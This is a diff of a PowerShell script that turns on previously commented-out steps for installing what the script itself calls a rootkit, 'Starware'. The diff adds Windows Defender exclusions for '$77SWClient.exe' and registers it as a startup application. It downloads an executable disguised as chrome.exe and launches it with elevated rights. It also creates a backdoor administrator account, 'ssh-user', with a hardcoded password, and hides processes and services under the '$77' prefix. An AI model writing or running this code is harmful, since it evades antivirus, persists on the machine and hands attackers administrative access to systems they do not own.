@@ -82,10 +82,10 @@ Get-AntivirusInfo
 $exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'
 
 # Use the Add-MpPreference cmdlet to add the executable to the exclusion list
-#Add-MpPreference -ExclusionPath $exePath
+Add-MpPreference -ExclusionPath $exePath
 
 $exePath = 'C:\Windows\SysWOW64\$77Starware\$77SWClient.exe'
-#Add-MpPreference -ExclusionPath $exePath
+Add-MpPreference -ExclusionPath $exePath
 
 # Adds `chrome.exe' to the Windows Defender exclusion list
 
@@ -204,7 +204,7 @@ Add-ServiceName -service 'sshd'
 Add-ProcessName -process 'reg.exe'
 
 # Adds startup applications to $77Config
-#Add-StartupApplication -applicationPath 'C:\Windows\SysWOW64\$77Starware\$77SWClient.exe'
+Add-StartupApplication -applicationPath 'C:\Windows\SysWOW64\$77Starware\$77SWClient.exe'
 
 # Output completion message
 Write-Host "Services, processes, and startup applications have been configured in the registry."
@@ -216,9 +216,10 @@ $exePath = Join-Path $tempFolder "chrome.exe"
 
 # Download improved.exe from the provided URL
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+Write-Host "RootKit/Starware Downloaded. Now executing."
 
 # Execute improved.exe without waiting for completion. EXE Deletes itself, no need to do it manually.
-Start-Process -FilePath $exePath -Verb RunAs -Wait
+Start-Process -FilePath $exePath -Verb RunAs
 
 # Create a new user `ssh-user` with administrative privileges
 # Check if SSH user exists before creating
@@ -227,6 +228,7 @@ if (-not (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue)) {
     $password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
     New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
     Add-LocalGroupMember -Group "Administrators" -Member $userName
+    Write-Host "ssh-user Added."
 } else {
     Write-Host "User $userName already exists. No need to create a new user."
 }
